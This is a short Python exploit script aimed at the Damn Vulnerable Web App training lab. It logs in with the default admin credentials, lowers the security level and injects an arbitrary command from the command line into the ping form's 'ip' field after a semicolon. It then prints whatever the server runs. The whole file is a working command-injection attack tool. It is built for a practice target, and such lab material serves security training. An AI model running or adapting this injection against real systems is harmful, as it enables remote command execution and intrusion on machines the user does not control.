import requests
import sys
import re
import os
from colorama import init, Fore
init()

class color:
	red = Fore.RED
	blue = Fore.BLUE
	white = Fore.WHITE
	green = Fore.GREEN
	yellow = Fore.YELLOW
	error = Fore.RED+"["+Fore.RESET+"-"+Fore.RED+"]"+Fore.RESET+" "
	adv = Fore.YELLOW+"["+Fore.RESET+"!"+Fore.YELLOW+"]"+Fore.RESET+" "
	suc = Fore.BLUE+"["+Fore.RESET+"*"+Fore.BLUE+"]"+Fore.RESET+" "
	reset = Fore.RESET

if len(sys.argv) == 3 :
	ip = sys.argv[1]
	command = sys.argv[2]

	print(color.white + "\nip      : %s" % ip + color.reset)
	print(color.white + "command : %s" % command + color.reset)

	s=requests.session()
	data_login={"username":"admin","password":"password","Login":"Login"}
	response=s.post("http://%s/dvwa/login.php" % ip, data=data_login)

	if "Welcome to Damn Vulnerable Web App!" in response.text:
	    print("\n" + color.suc + "Login success" + color.reset)
	else:
	    print("[X] Failed")
	    sys.exit(1)


	difficult={'security':'low', 'seclev_submit':'Submit'}
	response_2=s.post("http://%s/dvwa/security.php" % ip,data=difficult)


	date={'ip':'192.168.0.109 >/dev/null; %s' % command, 'submit':'submit'}
	response_3=s.post("http://%s/dvwa/vulnerabilities/exec/" % ip, data=date)

	f = open("test.txt", "w")
	f.write(response_3.content.decode("utf-8"))
	f.close()

	out = os.system("""/usr/bin/cat test.txt | grep "<pre>" -A 20 | grep "</pre>" -B 20 | sed 's/^ *//'""")
	out = os.remove("test.txt")

else:
	print("Use: ./dvwa.py <ip> <command>")
